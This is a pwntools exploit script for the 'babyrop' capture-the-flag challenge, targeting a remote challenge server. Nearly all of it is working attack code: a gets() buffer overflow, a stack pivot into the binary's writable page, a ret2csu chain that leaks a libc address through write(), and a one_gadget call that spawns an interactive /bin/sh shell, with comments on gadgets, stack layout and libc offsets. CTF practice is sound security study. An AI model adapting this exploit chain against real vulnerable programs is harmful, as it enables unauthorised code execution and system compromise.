

from pwn import *

# Set up pwntools for the correct architecture. See `context.binary/arch/bits/endianness` for more
exe = '../babyrop'
context.binary = exe # Infer target architecture, bit-with, and endianness from a binary file.
if args['REMOTE']:
    libc = ELF('/home/nikos/bin/binaries/libc-database/manual-downloads/libc6_2.31-0ubuntu9.1_amd64.so')
else:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # Ubuntu 20.04.1 LTS, libc-2.31.so

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, disable ASLR and run through GDB
# for all created processes: 
# $ ./exploit.py DEBUG NOASLR GDB
# You can also run the remote or local target with the option REMOTE
# Feasibility of remote debugging is possible only via ssh (not netcat) and depends from the remote system
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript, exe, *a, *kw)
    else:
        target = process([exe] + argv, *a, **kw)
    return target

# Specify your gdb script here for debugging. gdb will be launched the GDB argument is given.
gdbscript = '''
init-gef
# target record-full # Not supported due to AVX instructions

# break in leave main
b *0x0040116a

# break in main
b *0x401136

# <__libc_csu_init+73> call   QWORD PTR [r15+rbx*8]
b *0x4011b9
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

arguments = []
if args['REMOTE']:
    remote_server = 'dicec.tf'
    remote_port = 31924
    io = remote(remote_server, remote_port)
else:
    io = start(arguments)

# (gef) got
# GOT protection: Partial RelRO | GOT functions: 2
# [0x404018] write@GLIBC_2.2.5  →  0x401036
# [0x404020] gets@GLIBC_2.2.5  →  0x401046

nop_gadget = 0x40101a # ret;
rdi_gadget = 0x4011d3 # pop rdi; ret;
rsi_gadget = 0x4011d1 # pop rsi; pop r15; ret;

ret2csu_setter = 0x4011ca # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
ret2csu_call   = 0x4011b0 # mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8];

write__got_plt = 0x404018
gets__got_plt  = 0x404020
main = 0x00401136

# RW-page: [0x404000, 0x405000). The write areas here become stacks
write_area_first = 0x404800
write_area_second = 0x404700 # Use a different write area since the previous one became stack. Used to write our 3rd ROP chain.
  # When $rip is at `CALL gets(rdi)`, and we pass our 3rd ROP chain as input, the following is our stack:
  #   $rsp = 0x4048b8 = write_area_first  + something
  #   $rbp = 0x404740 = write_area_second + 0x40
  #   $rdi = write_area_second
  # This means that the bytes that we will write through gets() should NOT override our current stack! 
  # On the other hand, NOR should write_area_second overlap with the stack frame of gets()!
  # That is why in the write_area_second we choose an address that is smaller than write_area_first, but 
  # with large enough difference (write_area_first - write_area_second) so that our input will not overwrite the current stack.
  #
  # Also note that, once we have executed our 2nd ROP chain and we are sending the input for our 3rd ROP chain,
  # we are no longer interested in the value that we had written in write_area_first.

# Stage1: Leak libc
# write(1, gets@got, 0x100) (Remember order of registers: write(rdi, rsi, rdx))
#
# Stage2:
# Use one_gadget in glibc to invoke execve("/bin/sh\x00", NULL, NULL)

io.recvuntil(b'Your name: ')

# Set buf to point to our write area
payload  = b'A'*0x40
payload += p64(write_area_first + 0x40) # rbp
payload += p64(main + 0x1e) # ret to `LEA rbp-0x40` and start reading input again through gets(buf);
payload += b'\n' # Now, once `LEAVE` is called again in main, we will also have control of $rsp.
io.send(payload)

# Write to that area the return address for ret2csu_call gadget. Then return to our rop chain.
payload  = p64(rdi_gadget) # ret2csu_call gadget shall return to the address specified here
payload += b'D'*0x38
payload += b'E'*0x08 # rbp. Don't care. Will get overwritten
payload += p64(ret2csu_setter) # ret addr
payload += ( # ret2csu_setter arguments
    p64(0x0000000000000000) + # rbx
    p64(write_area_second + 0x40) + # rbp. Once our rop chain is finished, we still return to the `CALL gets` at main.
    p64(0x0000000000000000) + # r12
    p64(0x0000000000000000) + # r13
    p64(0x100) + # r14 (Will go into rdx)
    p64(write_area_first) + # r15. Will be used in the next gadget as: ret_addr = *r15
    p64(ret2csu_call) # ret_addr
)
payload += b'' # ret2csu_call arguments (Takes no arguments). This is a call gadget.
payload += ( # rdi_gadget. Used here to consume the pushed ret addr from the call gadget
    # consumed stack value goes into rdi
    p64(rdi_gadget) # ret_addr
)
payload += ( # rdi_gadget arguments.
    p64(0x01) + # rdi
    p64(rsi_gadget) # ret_addr
)
payload += ( # rsi_gadget
    p64(write__got_plt) + # rsi
    p64(0x0000000000000000) + # r15
    p64(0x0040114f) #ret_addr. Return to `CALL write` in main. Afterwards, we also end up in `gets(buf)` so we can write a new rop chain
)
payload += b'\n'
io.send(payload)

# Read leaked libc address
leaked_write__addr = u64(io.recvn(0x100)[0:8])
if args['REMOTE']:
    # write --> Offset in page: 0x1d0
    # gets  --> Offset in page: 0xaf0
    # Two possible results:
        # libc6_2.31-0ubuntu9.1_amd64
        # libc6_2.31-0ubuntu9.2_amd64
    # Both results have `write` and `one_gadget` at the same offset, so meh. Let's go with libc6_2.31-0ubuntu9.1_amd64.
    libc__base_addr = leaked_write__addr - 0x1111d0

    # nikos@laptop:~/bin/binaries/libc-database/manual-downloads$ one_gadget libc6_2.31-0ubuntu9.1_amd64.so 
    # 0xe6c7e execve("/bin/sh", r15, r12)
    # constraints:
    #   [r15] == NULL || r15 == NULL
    #   [r12] == NULL || r12 == NULL
    one_gadget = libc__base_addr + 0xe6c7e # execve("/bin/sh", r15, r12)
else:
    libc__base_addr = leaked_write__addr - 0x1111d0
    # system__addr = libc__base_addr + 0x55410 # system() exploit did not work. 
    #   Probably because our stack is way too small. 
    #   (Tested `system('/bin/sh\x00')` by manually restoring $rsp, when break-pointed at system+0x00, to the original stack and then it worked.)

    # nikos@laptop:~/ctfs/babyrop$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
    # 0xe6c7e execve("/bin/sh", r15, r12)
    # constraints:
    #   [r15] == NULL || r15 == NULL
    #   [r12] == NULL || r12 == NULL
    one_gadget = libc__base_addr + 0xe6c7e # execve("/bin/sh", r15, r12)

log.success('Successfully leaked libc base address: ' + hex(libc__base_addr))

# Do ROP again to invoke execve("/bin/sh", NULL, NULL) this time
payload  = b'A'*0x40
payload += b'B'*0x08 # rbp
payload += p64(one_gadget) # constraints are already met when we reach the one_gadget
payload += b'\n'
io.send(payload)

io.interactive()
io.close()
